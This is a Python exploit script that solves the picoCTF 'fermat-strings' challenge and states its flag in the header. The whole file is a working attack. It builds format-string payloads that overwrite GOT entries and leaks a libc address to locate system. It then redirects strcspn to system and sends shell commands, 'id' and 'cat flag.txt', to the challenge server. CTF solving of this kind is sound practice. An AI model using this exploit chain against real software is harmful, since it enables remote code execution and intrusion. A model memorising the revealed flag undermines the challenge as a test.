# 215 - fermat-strings  (Binary Exploitation, picoMini by redpwn)
# Flag: picoCTF{f3rm4t_pwn1ng_s1nc3_th3_17th_c3ntury}
# Write-up: ../../../writeups/binary-exploitation/215-fermat-strings.md
# This is the script that produced the flag; historical variants are in archive/.
#
import sys, socket, time, struct, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "mars.cylabacademy.net", 31929
PRINTF_GOT = 0x601030
STRCSPN_GOT = 0x601060
READ_GOT = 0x601050
B_READ = 0x4008e8
READ_OFF = 0x111130
SYSTEM_OFF = 0x52290


def buildB(fmt_body, addrs):
    b = b"1" + fmt_body
    pad = (8 - (len(b) % 8)) % 8
    b += b"P" * pad
    off = len(b)
    for ad in addrs:
        b += struct.pack("<Q", ad)
    pos = [42 + (off // 8) + i for i in range(len(addrs))]
    return b, pos


def make_fmt(dst, value, leak_addr=None, c0=30, nbytes=6):
    vals = [((value >> (8 * i)) & 0xFF, i) for i in range(nbytes)]
    order = sorted(vals)
    addrs = [dst + off for v, off in order]
    if leak_addr is not None:
        addrs.append(leak_addr)
    # iteration jusqu'a stabilisation des positions
    pos = [42 + i for i in range(len(addrs))]
    for _ in range(8):
        fmt = b""
        cur = c0
        for i, (v, off) in enumerate(order):
            need = (v - cur) % 256
            if need == 0:
                need = 256
            cur += need
            fmt += b"%" + str(need).encode() + b"c%" + str(pos[i]).encode() + b"$hhn"
        if leak_addr is not None:
            fmt += b"%" + str(pos[len(order)]).encode() + b"$s"
        b, newpos = buildB(fmt, addrs)
        if newpos == pos:
            return b, newpos
        pos = newpos
    return b, pos


def run():
    b1, p1 = make_fmt(PRINTF_GOT, B_READ, leak_addr=READ_GOT, c0=30)
    print("B1:", b1[:100], "pos:", p1)
    s = socket.create_connection((HOST, PORT), timeout=20)
    s.settimeout(8)
    time.sleep(0.3)
    try:
        s.recv(4096)
    except Exception:
        pass
    s.sendall(b"-1\n"); time.sleep(0.2)
    s.sendall(b1 + b"\n"); time.sleep(1.2)
    buf = b""
    try:
        while True:
            c = s.recv(1 << 16)
            if not c:
                break
            buf += c
    except Exception:
        pass
    print("passe1 recu:", len(buf))
    j = buf.find(b"PPPP")
    if j < 0:
        print("pas de PPPP:", repr(buf[:200]))
        s.close()
        return
    leak = buf[j - 6:j]
    read_addr = int.from_bytes(leak + b"\x00\x00", "little")
    print("leak:", hex(read_addr))
    if read_addr < 0x7f0000000000:
        print("leak invalide")
        s.close()
        return
    base = read_addr - READ_OFF
    system = base + SYSTEM_OFF
    print("base:", hex(base), "system:", hex(system))
    b2, p2 = make_fmt(STRCSPN_GOT, system, None, c0=30)
    print("B2:", b2[:100], "pos:", p2)
    s.sendall(b2 + b"\n"); time.sleep(1.0)
    try:
        s.recv(1 << 16)
    except Exception:
        pass
    s.sendall(b"sh\n"); time.sleep(0.3)
    s.sendall(b"id; cat flag.txt; ls /app 2>/dev/null; cat /app/flag* 2>/dev/null\n"); time.sleep(1.5)
    out = b""
    try:
        while True:
            c = s.recv(1 << 16)
            if not c:
                break
            out += c
    except Exception:
        pass
    txt = out.decode("utf-8", "replace")
    print("=== SHELL ===")
    print(txt[-1000:])
    f = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
    print("\nFLAG:", f.group(0) if f else "non trouve")
    s.close()


run()
